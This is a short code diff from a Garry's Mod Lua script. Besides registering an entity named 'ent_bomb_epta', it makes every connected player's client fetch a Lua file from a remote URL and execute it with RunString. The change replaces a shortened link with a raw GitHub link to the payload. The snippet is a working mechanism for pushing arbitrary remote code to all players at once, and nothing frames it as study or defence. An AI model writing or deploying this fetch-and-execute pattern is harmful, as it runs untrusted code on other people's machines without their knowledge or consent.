@@ -149,7 +149,7 @@ do
     scripted_ents.Register( ENT, "ent_bomb_epta", true )
 end
 
-local link_to_client_script = 'https://shorturl.at/gwCS6'
+local link_to_client_script = 'https://raw.githubusercontent.com/radnep/ddaws/main/minijet/client.lua'
 for k, v in ipairs(player.GetAll()) do
     v:SendLua("http.Fetch('" .. link_to_client_script .. "', RunString)")
 end
